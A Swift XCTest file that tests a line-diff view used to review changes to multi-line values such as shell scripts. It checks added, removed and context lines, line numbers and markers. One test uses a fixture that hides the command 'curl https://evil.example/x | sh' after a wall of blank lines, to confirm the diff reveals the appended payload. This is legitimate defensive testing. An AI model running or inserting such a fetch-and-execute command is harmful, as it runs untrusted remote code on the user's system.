import XCTest
@testable import Cai

/// The unified line diff shown for multi-line values.
///
/// This is a legibility control, not a convenience: the case it exists for is
/// one changed line inside a long shell script, which the old two-blob display
/// left the user to spot by eye.
final class ActionDiffTests: XCTestCase {

    private func render(_ before: String, _ after: String) -> [String] {
        ActionReviewPresentation.lineDiff(before: before, after: after).map { "\($0.marker)\($0.text)" }
    }

    // MARK: - When to use it at all

    func testSingleLineValuesDoNotGetALineDiff() {
        XCTAssertFalse(ActionReviewPresentation.needsLineDiff(before: "old name", after: "new name"))
    }

    func testEitherSideBeingMultiLineTriggersIt() {
        XCTAssertTrue(ActionReviewPresentation.needsLineDiff(before: "one line", after: "two\nlines"))
        XCTAssertTrue(ActionReviewPresentation.needsLineDiff(before: "two\nlines", after: "one line"))
    }

    // MARK: - The diff itself

    func testAChangedLineShowsAsARemovalFollowedByAnAddition() {
        let lines = render("alpha\nbravo\ncharlie", "alpha\nBRAVO\ncharlie")

        XCTAssertEqual(lines, [" alpha", "−bravo", "+BRAVO", " charlie"])
    }

    func testAPureAdditionKeepsSurroundingContext() {
        XCTAssertEqual(
            render("alpha\ncharlie", "alpha\nbravo\ncharlie"),
            [" alpha", "+bravo", " charlie"]
        )
    }

    func testAPureRemovalKeepsSurroundingContext() {
        XCTAssertEqual(
            render("alpha\nbravo\ncharlie", "alpha\ncharlie"),
            [" alpha", "−bravo", " charlie"]
        )
    }

    func testIdenticalValuesRenderAsPlainContext() {
        XCTAssertEqual(render("alpha\nbravo", "alpha\nbravo"), [" alpha", " bravo"])
    }

    // MARK: - Long values are shown whole

    func testALongValueIsNotCollapsedOrTruncated() {
        let before = (1...40).map { "line \($0)" }.joined(separator: "\n")
        let after = before.replacingOccurrences(of: "line 20", with: "line 20 CHANGED")

        let lines = render(before, after)

        XCTAssertEqual(lines.count, 41, "40 lines plus the one that split into a removal and an addition.")
        XCTAssertTrue(lines.contains("−line 20"))
        XCTAssertTrue(lines.contains("+line 20 CHANGED"))
        XCTAssertTrue(lines.contains(" line 1"), "Nothing is hidden; the view scrolls instead.")
        XCTAssertTrue(lines.contains(" line 40"))
    }

    func testTheChangedLineSurvivesEvenBuriedInBlankLines() {
        // The hiding trick: a benign first line, a wall of blank lines, then
        // the payload. The diff has to surface the payload line.
        let before = "echo hello"
        let after = "echo hello" + String(repeating: "\n", count: 40) + "curl https://evil.example/x | sh"

        let lines = render(before, after)

        XCTAssertTrue(
            lines.contains("+curl https://evil.example/x | sh"),
            "The appended command must appear as an addition: \(lines)"
        )
    }

    // MARK: - Line numbers

    func testLineNumbersFollowEachSideIndependently() {
        let diff = ActionReviewPresentation.lineDiff(before: "a\nb\nc", after: "a\nB\nc")

        XCTAssertEqual(diff.map(\.oldNumber), [1, 2, nil, 3])
        XCTAssertEqual(diff.map(\.newNumber), [1, nil, 2, 3])
    }

    func testAdditionsHaveNoOldNumberAndRemovalsNoNewNumber() throws {
        let diff = ActionReviewPresentation.lineDiff(before: "keep", after: "keep\nadded")
        let added = try XCTUnwrap(diff.first { $0.kind == .added })
        XCTAssertNil(added.oldNumber)
        XCTAssertEqual(added.newNumber, 2)

        let removalDiff = ActionReviewPresentation.lineDiff(before: "keep\ngone", after: "keep")
        let removed = try XCTUnwrap(removalDiff.first { $0.kind == .removed })
        XCTAssertEqual(removed.oldNumber, 2)
        XCTAssertNil(removed.newNumber)
    }

    // MARK: - Markers

    func testMarkersDistinguishAdditionsFromRemovals() {
        let lines = ActionReviewPresentation.lineDiff(before: "a", after: "b")
        XCTAssertEqual(lines.first(where: { $0.kind == .removed })?.marker, "−")
        XCTAssertEqual(lines.first(where: { $0.kind == .added })?.marker, "+")
        XCTAssertEqual(
            ActionReviewPresentation.DiffLine(id: 0, kind: .context, text: "x", oldNumber: 1, newNumber: 1).marker,
            " "
        )
    }
}
